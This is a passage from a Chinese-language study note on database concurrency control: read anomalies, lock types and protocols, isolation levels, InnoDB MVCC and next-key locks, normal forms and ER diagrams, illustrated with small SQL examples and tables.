<h2 id="读脏数据" tabindex="-1"> 读脏数据</h2>
<p>T<sub>1</sub> 修改一个数据，T<sub>2</sub> 随后读取这个数据。如果 T<sub>1</sub> 撤销了这次修改，那么 T<sub>2</sub> 读取的数据是脏数据。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/af0e94d9-502d-4531-938f-d46dd29de52d.png" width="360px"> </div><br>
<h2 id="不可重复读" tabindex="-1"> 不可重复读</h2>
<p>T<sub>2</sub> 读取一个数据，T<sub>1</sub> 对该数据做了修改。如果 T<sub>2</sub> 再次读取这个数据，此时读取的结果和第一次读取的结果不同。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/66ae164c-ad47-4905-895e-51fe38ce797a.png" width="360px"> </div><br>
<h2 id="幻影读" tabindex="-1"> 幻影读</h2>
<p>T<sub>1</sub> 读取某个范围的数据，T<sub>2</sub> 在这个范围内插入新的数据，T<sub>1</sub> 再次读取这个范围的数据，此时读取的结果和和第一次读取的结果不同。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/8fdc577d-552d-4b43-b5e4-a8f98bc2cb51.png" width="340px"> </div><br>
<hr>
<p>产生并发不一致性问题主要原因是破坏了事务的隔离性，解决方法是通过并发控制来保证隔离性。并发控制可以通过封锁来实现，但是封锁操作需要用户自己控制，相当复杂。数据库管理系统提供了事务的隔离级别，让用户以一种更轻松的方式处理并发一致性问题。</p>
<h1 id="三、封锁" tabindex="-1"> 三、封锁</h1>
<h2 id="封锁粒度" tabindex="-1"> 封锁粒度</h2>
<p>MySQL 中提供了两种封锁粒度：行级锁以及表级锁。</p>
<p>应该尽量只锁定需要修改的那部分数据，而不是所有的资源。锁定的数据量越少，发生锁争用的可能就越小，系统的并发程度就越高。</p>
<p>但是加锁需要消耗资源，锁的各种操作（包括获取锁、释放锁、以及检查锁状态）都会增加系统开销。因此封锁粒度越小，系统开销就越大。</p>
<p>在选择封锁粒度时，需要在锁开销和并发程度之间做一个权衡。</p>
<h2 id="封锁类型" tabindex="-1"> 封锁类型</h2>
<h3 id="_1-读写锁" tabindex="-1"> 1. 读写锁</h3>
<ul>
<li>排它锁（Exclusive），简写为 X 锁，又称写锁。</li>
<li>共享锁（Shared），简写为 S 锁，又称读锁。</li>
</ul>
<p>有以下两个规定：</p>
<ul>
<li>一个事务对数据对象 A 加了 X 锁，就可以对 A 进行读取和更新。加锁期间其它事务不能对 A 加任何锁。</li>
<li>一个事务对数据对象 A 加了 S 锁，可以对 A 进行读取操作，但是不能进行更新操作。加锁期间其它事务能对 A 加 S 锁，但是不能加 X 锁。</li>
</ul>
<p>锁的兼容关系如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th style="text-align:center">X</th>
<th style="text-align:center">S</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><strong>X</strong></td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center"><strong>S</strong></td>
<td style="text-align:center">×</td>
<td style="text-align:center">√</td>
</tr>
</tbody>
</table>
<h3 id="_2-意向锁" tabindex="-1"> 2. 意向锁</h3>
<p>使用意向锁（Intention Locks）可以更容易地支持多粒度封锁。</p>
<p>在存在行级锁和表级锁的情况下，事务 T 想要对表 A 加 X 锁，就需要先检测是否有其它事务对表 A 或者表 A 中的任意一行加了锁，那么就需要对表 A 的每一行都检测一次，这是非常耗时的。</p>
<p>意向锁在原来的 X/S 锁之上引入了 IX/IS，IX/IS 都是表锁，用来表示一个事务想要在表中的某个数据行上加 X 锁或 S 锁。有以下两个规定：</p>
<ul>
<li>一个事务在获得某个数据行对象的 S 锁之前，必须先获得表的 IS 锁或者更强的锁；</li>
<li>一个事务在获得某个数据行对象的 X 锁之前，必须先获得表的 IX 锁。</li>
</ul>
<p>通过引入意向锁，事务 T 想要对表 A 加 X 锁，只需要先检测是否有其它事务对表 A 加了 X/IX/S/IS 锁，如果加了就表示有其它事务正在使用这个表或者表中某一行的锁，因此事务 T 加 X 锁失败。</p>
<p>各种锁的兼容关系如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th style="text-align:center">X</th>
<th style="text-align:center">IX</th>
<th style="text-align:center">S</th>
<th style="text-align:center">IS</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><strong>X</strong></td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center"><strong>IX</strong></td>
<td style="text-align:center">×</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center"><strong>S</strong></td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center"><strong>IS</strong></td>
<td style="text-align:center">×</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
</tbody>
</table>
<p>解释如下：</p>
<ul>
<li>任意 IS/IX 锁之间都是兼容的，因为它们只是表示想要对表加锁，而不是真正加锁；</li>
<li>S 锁只与 S 锁和 IS 锁兼容，也就是说事务 T 想要对数据行加 S 锁，其它事务可以已经获得对表或者表中的行的 S 锁。</li>
</ul>
<h2 id="封锁协议" tabindex="-1"> 封锁协议</h2>
<h3 id="_1-三级封锁协议" tabindex="-1"> 1. 三级封锁协议</h3>
<p><strong>一级封锁协议</strong></p>
<p>事务 T 要修改数据 A 时必须加 X 锁，直到 T 结束才释放锁。</p>
<p>可以解决丢失修改问题，因为不能同时有两个事务对同一个数据进行修改，那么事务的修改就不会被覆盖。</p>
<table>
<thead>
<tr>
<th style="text-align:center">T<sub>1</sub></th>
<th style="text-align:center">T<sub>2</sub></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">lock-x(A)</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">read A=20</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">lock-x(A)</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">wait</td>
</tr>
<tr>
<td style="text-align:center">write A=19</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center">commit</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center">unlock-x(A)</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">obtain</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">read A=19</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">write A=21</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">commit</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">unlock-x(A)</td>
</tr>
</tbody>
</table>
<p><strong>二级封锁协议</strong></p>
<p>在一级的基础上，要求读取数据 A 时必须加 S 锁，读取完马上释放 S 锁。</p>
<p>可以解决读脏数据问题，因为如果一个事务在对数据 A 进行修改，根据 1 级封锁协议，会加 X 锁，那么就不能再加 S 锁了，也就是不会读入数据。</p>
<table>
<thead>
<tr>
<th style="text-align:center">T<sub>1</sub></th>
<th style="text-align:center">T<sub>2</sub></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">lock-x(A)</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">read A=20</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">write A=19</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">lock-s(A)</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">wait</td>
</tr>
<tr>
<td style="text-align:center">rollback</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center">A=20</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center">unlock-x(A)</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">obtain</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">read A=20</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">unlock-s(A)</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">commit</td>
</tr>
</tbody>
</table>
<p><strong>三级封锁协议</strong></p>
<p>在二级的基础上，要求读取数据 A 时必须加 S 锁，直到事务结束了才能释放 S 锁。</p>
<p>可以解决不可重复读的问题，因为读 A 时，其它事务不能对 A 加 X 锁，从而避免了在读的期间数据发生改变。</p>
<table>
<thead>
<tr>
<th style="text-align:center">T<sub>1</sub></th>
<th style="text-align:center">T<sub>2</sub></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">lock-s(A)</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">read A=20</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">lock-x(A)</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">wait</td>
</tr>
<tr>
<td style="text-align:center">read A=20</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center">commit</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center">unlock-s(A)</td>
<td style="text-align:center">.</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">obtain</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">read A=20</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">write A=19</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">commit</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">unlock-X(A)</td>
</tr>
</tbody>
</table>
<h3 id="_2-两段锁协议" tabindex="-1"> 2. 两段锁协议</h3>
<p>加锁和解锁分为两个阶段进行。</p>
<p>可串行化调度是指，通过并发控制，使得并发执行的事务结果与某个串行执行的事务结果相同。</p>
<p>事务遵循两段锁协议是保证可串行化调度的充分条件。例如以下操作满足两段锁协议，它是可串行化调度。</p>
<div><pre><code>lock-x(A)...lock-s(B)...lock-s(C)...unlock(A)...unlock(C)...unlock(B)
</code></pre></div><p>但不是必要条件，例如以下操作不满足两段锁协议，但是它还是可串行化调度。</p>
<div><pre><code>lock-x(A)...unlock(A)...lock-s(B)...unlock(B)...lock-s(C)...unlock(C)
</code></pre></div><h2 id="mysql-隐式与显示锁定" tabindex="-1"> MySQL 隐式与显示锁定</h2>
<p>MySQL 的 InnoDB 存储引擎采用两段锁协议，会根据隔离级别在需要的时候自动加锁，并且所有的锁都是在同一时刻被释放，这被称为隐式锁定。</p>
<p>InnoDB 也可以使用特定的语句进行显示锁定：</p>
<div><pre><code><span>SELECT</span> <span>.</span><span>.</span><span>.</span> <span>LOCK</span> <span>In</span> <span>SHARE</span> <span>MODE</span><span>;</span>
<span>SELECT</span> <span>.</span><span>.</span><span>.</span> <span>FOR</span> <span>UPDATE</span><span>;</span>
</code></pre></div><h1 id="四、隔离级别" tabindex="-1"> 四、隔离级别</h1>
<h2 id="未提交读-read-uncommitted" tabindex="-1"> 未提交读（READ UNCOMMITTED）</h2>
<p>事务中的修改，即使没有提交，对其它事务也是可见的。</p>
<h2 id="提交读-read-committed" tabindex="-1"> 提交读（READ COMMITTED）</h2>
<p>一个事务只能读取已经提交的事务所做的修改。换句话说，一个事务所做的修改在提交之前对其它事务是不可见的。</p>
<h2 id="可重复读-repeatable-read" tabindex="-1"> 可重复读（REPEATABLE READ）</h2>
<p>保证在同一个事务中多次读取同样数据的结果是一样的。</p>
<h2 id="可串行化-serializable" tabindex="-1"> 可串行化（SERIALIZABLE）</h2>
<p>强制事务串行执行。</p>
<p>需要加锁实现，而其它隔离级别通常不需要。</p>
<hr>
<table>
<thead>
<tr>
<th style="text-align:center">隔离级别</th>
<th style="text-align:center">脏读</th>
<th style="text-align:center">不可重复读</th>
<th style="text-align:center">幻影读</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">未提交读</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">提交读</td>
<td style="text-align:center">×</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">可重复读</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">√</td>
</tr>
<tr>
<td style="text-align:center">可串行化</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
</tr>
</tbody>
</table>
<h1 id="五、多版本并发控制" tabindex="-1"> 五、多版本并发控制</h1>
<p>多版本并发控制（Multi-Version Concurrency Control, MVCC）是 MySQL 的 InnoDB 存储引擎实现隔离级别的一种具体方式，用于实现提交读和可重复读这两种隔离级别。而未提交读隔离级别总是读取最新的数据行，无需使用 MVCC。可串行化隔离级别需要对所有读取的行都加锁，单纯使用 MVCC 无法实现。</p>
<h2 id="版本号" tabindex="-1"> 版本号</h2>
<ul>
<li>系统版本号：是一个递增的数字，每开始一个新的事务，系统版本号就会自动递增。</li>
<li>事务版本号：事务开始时的系统版本号。</li>
</ul>
<h2 id="隐藏的列" tabindex="-1"> 隐藏的列</h2>
<p>MVCC 在每行记录后面都保存着两个隐藏的列，用来存储两个版本号：</p>
<ul>
<li>创建版本号：指示创建一个数据行的快照时的系统版本号；</li>
<li>删除版本号：如果该快照的删除版本号大于当前事务版本号表示该快照有效，否则表示该快照已经被删除了。</li>
</ul>
<h2 id="undo-日志" tabindex="-1"> Undo 日志</h2>
<p>MVCC 使用到的快照存储在 Undo 日志中，该日志通过回滚指针把一个数据行（Record）的所有快照连接起来。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e41405a8-7c05-4f70-8092-e961e28d3112.jpg" width="300px"> </div><br>
<h3 id="insert-undo-log" tabindex="-1"> insert undo log</h3>
<p>代表事务在insert新记录时产生的undo log, 只在事务回滚时需要，并且在事务提交后可以被立即丢弃</p>
<h3 id="update-undo-log" tabindex="-1"> update undo log</h3>
<p>事务在进行update或delete时产生的undo log; 不仅在事务回滚时需要，在快照读时也需要；所以不能随便删除，只有在快速读或事务回滚不涉及该日志时，对应的日志才会被purge线程统一清除</p>
<h2 id="实现过程" tabindex="-1"> 实现过程</h2>
<p>以下实现过程针对可重复读隔离级别。</p>
<p>当开始一个事务时，该事务的版本号肯定大于当前所有数据行快照的创建版本号，理解这一点很关键。数据行快照的创建版本号是创建数据行快照时的系统版本号，系统版本号随着创建事务而递增，因此新创建一个事务时，这个事务的系统版本号比之前的系统版本号都大，也就是比所有数据行快照的创建版本号都大。</p>
<h3 id="_1-select" tabindex="-1"> 1. SELECT</h3>
<p>多个事务必须读取到同一个数据行的快照，并且这个快照是距离现在最近的一个有效快照。但是也有例外，如果有一个事务正在修改该数据行，那么它可以读取事务本身所做的修改，而不用和其它事务的读取结果一致。</p>
<p>把没有对一个数据行做修改的事务称为 T，T 所要读取的数据行快照的创建版本号必须小于等于 T 的版本号，因为如果大于 T 的版本号，那么表示该数据行快照是其它事务的最新修改，因此不能去读取它。除此之外，T 所要读取的数据行快照的删除版本号必须是未定义或者大于 T 的版本号，因为如果小于等于 T 的版本号，那么表示该数据行快照是已经被删除的，不应该去读取它。</p>
<h3 id="_2-insert" tabindex="-1"> 2. INSERT</h3>
<p>将当前系统版本号作为数据行快照的创建版本号。</p>
<h3 id="_3-delete" tabindex="-1"> 3. DELETE</h3>
<p>将当前系统版本号作为数据行快照的删除版本号。</p>
<h3 id="_4-update" tabindex="-1"> 4. UPDATE</h3>
<p>将当前系统版本号作为更新前的数据行快照的删除版本号，并将当前系统版本号作为更新后的数据行快照的创建版本号。可以理解为先执行 DELETE 后执行 INSERT。</p>
<h2 id="快照读与当前读" tabindex="-1"> 快照读与当前读</h2>
<h3 id="_1-快照读" tabindex="-1"> 1. 快照读</h3>
<p>使用 MVCC 读取的是快照中的数据，这样可以减少加锁所带来的开销。</p>
<div><pre><code><span>select</span> <span>*</span> <span>from</span> <span>table</span> <span>.</span><span>.</span><span>.</span><span>;</span>
</code></pre></div><h3 id="_2-当前读" tabindex="-1"> 2. 当前读</h3>
<p>读取的是最新的数据，需要加锁。以下第一个语句需要加 S 锁，其它都需要加 X 锁。</p>
<div><pre><code><span>select</span> <span>*</span> <span>from</span> <span>table</span> <span>where</span> ? <span>lock</span> <span>in</span> <span>share</span> <span>mode</span><span>;</span>
<span>select</span> <span>*</span> <span>from</span> <span>table</span> <span>where</span> ? <span>for</span> <span>update</span><span>;</span>
<span>insert</span><span>;</span>
<span>update</span><span>;</span>
<span>delete</span><span>;</span>
</code></pre></div><h1 id="六、next-key-locks" tabindex="-1"> 六、Next-Key Locks</h1>
<p>Next-Key Locks 是 MySQL 的 InnoDB 存储引擎的一种锁实现。</p>
<p>MVCC 不能解决幻影读问题，Next-Key Locks 就是为了解决这个问题而存在的。在可重复读（REPEATABLE READ）隔离级别下，使用 MVCC + Next-Key Locks 可以解决幻读问题。</p>
<h2 id="record-locks" tabindex="-1"> Record Locks</h2>
<p>锁定一个记录上的索引，而不是记录本身。</p>
<p>如果表没有设置索引，InnoDB 会自动在主键上创建隐藏的聚簇索引，因此 Record Locks 依然可以使用。</p>
<h2 id="gap-locks" tabindex="-1"> Gap Locks</h2>
<p>锁定索引之间的间隙，但是不包含索引本身。例如当一个事务执行以下语句，其它事务就不能在 t.c 中插入 15。</p>
<div><pre><code><span>SELECT</span> c <span>FROM</span> t <span>WHERE</span> c <span>BETWEEN</span> <span>10</span> <span>and</span> <span>20</span> <span>FOR</span> <span>UPDATE</span><span>;</span>
</code></pre></div><h2 id="next-key-locks" tabindex="-1"> Next-Key Locks</h2>
<p>它是 Record Locks 和 Gap Locks 的结合，不仅锁定一个记录上的索引，也锁定索引之间的间隙。例如一个索引包含以下值：10, 11, 13, and 20，那么就需要锁定以下区间：</p>
<div><pre><code><span>(</span><span>-</span>∞<span>,</span> <span>10</span><span>]</span>
<span>(</span><span>10</span><span>,</span> <span>11</span><span>]</span>
<span>(</span><span>11</span><span>,</span> <span>13</span><span>]</span>
<span>(</span><span>13</span><span>,</span> <span>20</span><span>]</span>
<span>(</span><span>20</span><span>,</span> <span>+</span>∞<span>)</span>
</code></pre></div><ol>
<li>innodb对于行的查询使用next-key lock</li>
<li>Next-locking keying为了解决Phantom Problem幻读问题</li>
<li>当查询的索引含有唯一属性时，将next-key lock降级为record key</li>
<li>Gap锁设计的目的是为了阻止多个事务将记录插入到同一范围内，而这会导致幻读问题的产生</li>
<li>有两种方式显式关闭gap锁：（除了外键约束和唯一性检查外，其余情况仅使用record lock）<br>
a. 将事务隔离级别设置为RC
b. 将参数innodb_locks_unsafe_for_binlog设置为1</li>
</ol>
<h1 id="七、关系数据库设计理论" tabindex="-1"> 七、关系数据库设计理论</h1>
<h2 id="函数依赖" tabindex="-1"> 函数依赖</h2>
<p>记 A-&gt;B 表示 A 函数决定 B，也可以说 B 函数依赖于 A。</p>
<p>如果 {A1，A2，... ，An} 是关系的一个或多个属性的集合，该集合函数决定了关系的其它所有属性并且是最小的，那么该集合就称为键码。</p>
<p>对于 A-&gt;B，如果能找到 A 的真子集 A'，使得 A'-&gt; B，那么 A-&gt;B 就是部分函数依赖，否则就是完全函数依赖。</p>
<p>对于 A-&gt;B，B-&gt;C，则 A-&gt;C 是一个传递函数依赖。</p>
<h2 id="异常" tabindex="-1"> 异常</h2>
<p>以下的学生课程关系的函数依赖为 {Sno, Cname} -&gt; {Sname, Sdept, Mname, Grade}，键码为 {Sno, Cname}。也就是说，确定学生和课程之后，就能确定其它信息。</p>
<table>
<thead>
<tr>
<th style="text-align:center">Sno</th>
<th style="text-align:center">Sname</th>
<th style="text-align:center">Sdept</th>
<th style="text-align:center">Mname</th>
<th style="text-align:center">Cname</th>
<th style="text-align:center">Grade</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">学生-1</td>
<td style="text-align:center">学院-1</td>
<td style="text-align:center">院长-1</td>
<td style="text-align:center">课程-1</td>
<td style="text-align:center">90</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">学生-2</td>
<td style="text-align:center">学院-2</td>
<td style="text-align:center">院长-2</td>
<td style="text-align:center">课程-2</td>
<td style="text-align:center">80</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">学生-2</td>
<td style="text-align:center">学院-2</td>
<td style="text-align:center">院长-2</td>
<td style="text-align:center">课程-1</td>
<td style="text-align:center">100</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">学生-3</td>
<td style="text-align:center">学院-2</td>
<td style="text-align:center">院长-2</td>
<td style="text-align:center">课程-2</td>
<td style="text-align:center">95</td>
</tr>
</tbody>
</table>
<p>不符合范式的关系，会产生很多异常，主要有以下四种异常：</p>
<ul>
<li>冗余数据：例如 <code>学生-2</code> 出现了两次。</li>
<li>修改异常：修改了一个记录中的信息，但是另一个记录中相同的信息却没有被修改。</li>
<li>删除异常：删除一个信息，那么也会丢失其它信息。例如删除了 <code>课程-1</code> 需要删除第一行和第三行，那么 <code>学生-1</code> 的信息就会丢失。</li>
<li>插入异常：例如想要插入一个学生的信息，如果这个学生还没选课，那么就无法插入。</li>
</ul>
<h2 id="范式" tabindex="-1"> 范式</h2>
<p>范式理论是为了解决以上提到四种异常。</p>
<p>高级别范式的依赖于低级别的范式，1NF 是最低级别的范式。</p>
<h3 id="_1-第一范式-1nf" tabindex="-1"> 1. 第一范式 (1NF)</h3>
<p>属性不可分。</p>
<h3 id="_2-第二范式-2nf" tabindex="-1"> 2. 第二范式 (2NF)</h3>
<p>每个非主属性完全函数依赖于键码。</p>
<p>可以通过分解来满足。</p>
<p><strong>分解前</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">Sno</th>
<th style="text-align:center">Sname</th>
<th style="text-align:center">Sdept</th>
<th style="text-align:center">Mname</th>
<th style="text-align:center">Cname</th>
<th style="text-align:center">Grade</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">学生-1</td>
<td style="text-align:center">学院-1</td>
<td style="text-align:center">院长-1</td>
<td style="text-align:center">课程-1</td>
<td style="text-align:center">90</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">学生-2</td>
<td style="text-align:center">学院-2</td>
<td style="text-align:center">院长-2</td>
<td style="text-align:center">课程-2</td>
<td style="text-align:center">80</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">学生-2</td>
<td style="text-align:center">学院-2</td>
<td style="text-align:center">院长-2</td>
<td style="text-align:center">课程-1</td>
<td style="text-align:center">100</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">学生-3</td>
<td style="text-align:center">学院-2</td>
<td style="text-align:center">院长-2</td>
<td style="text-align:center">课程-2</td>
<td style="text-align:center">95</td>
</tr>
</tbody>
</table>
<p>以上学生课程关系中，{Sno, Cname} 为键码，有如下函数依赖：</p>
<ul>
<li>Sno -&gt; Sname, Sdept</li>
<li>Sdept -&gt; Mname</li>
<li>Sno, Cname-&gt; Grade</li>
</ul>
<p>Grade 完全函数依赖于键码，它没有任何冗余数据，每个学生的每门课都有特定的成绩。</p>
<p>Sname, Sdept 和 Mname 都部分依赖于键码，当一个学生选修了多门课时，这些数据就会出现多次，造成大量冗余数据。</p>
<p><strong>分解后</strong></p>
<p>关系-1</p>
<table>
<thead>
<tr>
<th style="text-align:center">Sno</th>
<th style="text-align:center">Sname</th>
<th style="text-align:center">Sdept</th>
<th style="text-align:center">Mname</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">学生-1</td>
<td style="text-align:center">学院-1</td>
<td style="text-align:center">院长-1</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">学生-2</td>
<td style="text-align:center">学院-2</td>
<td style="text-align:center">院长-2</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">学生-3</td>
<td style="text-align:center">学院-2</td>
<td style="text-align:center">院长-2</td>
</tr>
</tbody>
</table>
<p>有以下函数依赖：</p>
<ul>
<li>Sno -&gt; Sname, Sdept</li>
<li>Sdept -&gt; Mname</li>
</ul>
<p>关系-2</p>
<table>
<thead>
<tr>
<th style="text-align:center">Sno</th>
<th style="text-align:center">Cname</th>
<th style="text-align:center">Grade</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">课程-1</td>
<td style="text-align:center">90</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">课程-2</td>
<td style="text-align:center">80</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">课程-1</td>
<td style="text-align:center">100</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">课程-2</td>
<td style="text-align:center">95</td>
</tr>
</tbody>
</table>
<p>有以下函数依赖：</p>
<ul>
<li>Sno, Cname -&gt;  Grade</li>
</ul>
<h3 id="_3-第三范式-3nf" tabindex="-1"> 3. 第三范式 (3NF)</h3>
<p>非主属性不传递函数依赖于键码。</p>
<p>上面的 关系-1 中存在以下传递函数依赖：</p>
<ul>
<li>Sno -&gt; Sdept -&gt; Mname</li>
</ul>
<p>可以进行以下分解：</p>
<p>关系-11</p>
<table>
<thead>
<tr>
<th style="text-align:center">Sno</th>
<th style="text-align:center">Sname</th>
<th style="text-align:center">Sdept</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">学生-1</td>
<td style="text-align:center">学院-1</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">学生-2</td>
<td style="text-align:center">学院-2</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">学生-3</td>
<td style="text-align:center">学院-2</td>
</tr>
</tbody>
</table>
<p>关系-12</p>
<table>
<thead>
<tr>
<th style="text-align:center">Sdept</th>
<th style="text-align:center">Mname</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">学院-1</td>
<td style="text-align:center">院长-1</td>
</tr>
<tr>
<td style="text-align:center">学院-2</td>
<td style="text-align:center">院长-2</td>
</tr>
</tbody>
</table>
<h3 id="判断" tabindex="-1"> 判断</h3>
<p>⑴ 判断非键属性是否部分依赖于候选键； 是则为1NF，否则进行⑵；</p>
<p>⑵ 判断非键属性是否传递依赖于候选键； 是则为2NF，否则进行⑶；</p>
<p>⑶ 判断所有依赖下左边是否全为候选键； 是则为BCNF，否则为3NF；</p>
<h1 id="八、er-图" tabindex="-1"> 八、ER 图</h1>
<p>Entity-Relationship，有三个组成部分：实体、属性、联系。</p>
<p>用来进行关系型数据库系统的概念设计。</p>
<h2 id="实体的三种联系" tabindex="-1"> 实体的三种联系</h2>
<p>包含一对一，一对多，多对多三种。</p>
<ul>
<li>如果 A 到 B 是一对多关系，那么画个带箭头的线段指向 B；</li>
<li>如果是一对一，画两个带箭头的线段；</li>
<li>如果是多对多，画两个不带箭头的线段。</li>
</ul>
<p>下图的 Course 和 Student 是一对多的关系。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1d28ad05-39e5-49a2-a6a1-a6f496adba6a.png" width="380px"> </div><br>
<h2 id="表示出现多次的关系" tabindex="-1"> 表示出现多次的关系</h2>
<p>一个实体在联系出现几次，就要用几条线连接。</p>
<p>下图表示一个课程的先修关系，先修关系出现两个 Course 实体，第一个是先修课程，后一个是后修课程，因此需要用两条线来表示这种关系。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ac929ea3-daca-40ec-9e95-4b2fa6678243.png" width="250px"> </div><br>
<h2 id="联系的多向性" tabindex="-1"> 联系的多向性</h2>
<p>虽然老师可以开设多门课，并且可以教授多名学生，但是对于特定的学生和课程，只有一个老师教授，这就构成了一个三元联系。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5bb1b38a-527e-4802-a385-267dadbd30ba.png" width="350px"> </div><br>
<h2 id="表示子类" tabindex="-1"> 表示子类</h2>
<p>用一个三角形和两条线来连接类和子类，与子类有关的属性和联系都连到子类上，而与父类和子类都有关的连到父类上。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/14389ea4-8d96-4e96-9f76-564ca3324c1e.png" width="450px"> </div><br>
<h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li>AbrahamSilberschatz, HenryF.Korth, S.Sudarshan, 等. 数据库系统概念 [M]. 机械工业出版社, 2006.</li>
<li>施瓦茨. 高性能 MYSQL(第3版)[M]. 电子工业出版社, 2013.</li>
<li>史嘉权. 数据库系统概论[M]. 清华大学出版社有限公司, 2006.</li>
<li><a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-storage-engine.html" target="_blank" rel="noopener noreferrer">The InnoDB Storage Engine</a></li>
<li><a href="https://www.slideshare.net/ErnestoHernandezRodriguez/transaction-isolation-levels" target="_blank" rel="noopener noreferrer">Transaction isolation levels</a></li>
<li><a href="http://scanftree.com/dbms/2-phase-locking-protocol" target="_blank" rel="noopener noreferrer">Concurrency Control</a></li>
<li><a href="https://www.slideshare.net/brshristov/the-nightmare-of-locking-blocking-and-isolation-levels-46391666" target="_blank" rel="noopener noreferrer">The Nightmare of Locking, Blocking and Isolation Levels!</a></li>
